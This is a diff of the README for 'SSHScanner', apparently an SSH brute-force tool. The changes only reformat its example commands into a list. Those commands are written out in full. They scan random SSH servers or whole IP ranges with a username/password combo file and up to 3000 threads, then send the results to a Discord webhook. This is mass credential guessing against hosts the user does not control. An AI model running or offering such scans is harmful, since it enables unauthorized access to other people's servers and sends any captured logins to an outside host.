@@ -30,9 +30,9 @@ You can reuse SSHScanner but make sure you comply with the [LICENSE](https://git
 
 *Here are some examples of commands according to your need*
 
-**Scan random SSH servers :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true
-**Scan SSH range :** java -jar SSHScanner.jar -range range.txt -combo combo.txt -threads 3000 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose false
-**Scan specific SSH server :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true -host "127.0.0.1"
+- **Scan random SSH servers :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true
+- **Scan SSH range :** java -jar SSHScanner.jar -range range.txt -combo combo.txt -threads 3000 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose false
+- **Scan specific SSH server :** java -jar SSHScanner.jar -combo combo.txt -threads 1 -port 22 -timeout 6000 -webhook "https://discord.com/api/webhooks/x/y" -verbose true -host "127.0.0.1"
 
 
 ## Arguments
